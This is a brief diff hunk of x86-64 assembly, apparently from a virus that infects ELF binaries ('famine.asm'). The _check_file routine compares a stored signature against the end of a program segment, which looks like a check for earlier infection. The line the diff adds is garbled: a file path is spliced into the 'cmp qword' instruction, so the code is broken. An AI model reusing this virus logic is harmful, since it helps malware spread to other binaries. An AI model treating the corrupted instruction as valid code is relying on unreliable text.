@@ -192,7 +192,7 @@ _check_file:
 				add r8, [r14 + elf64_phdr.p_filesz]
 				sub r8, signature_len
 				mov r9, [rel signature]
-				cmp qword r9, [r8]
+				cmp qworasm/famine.asmd r9, [r8]
 				je _unmap_close_inf
 
 			_valid_seg_already_found:
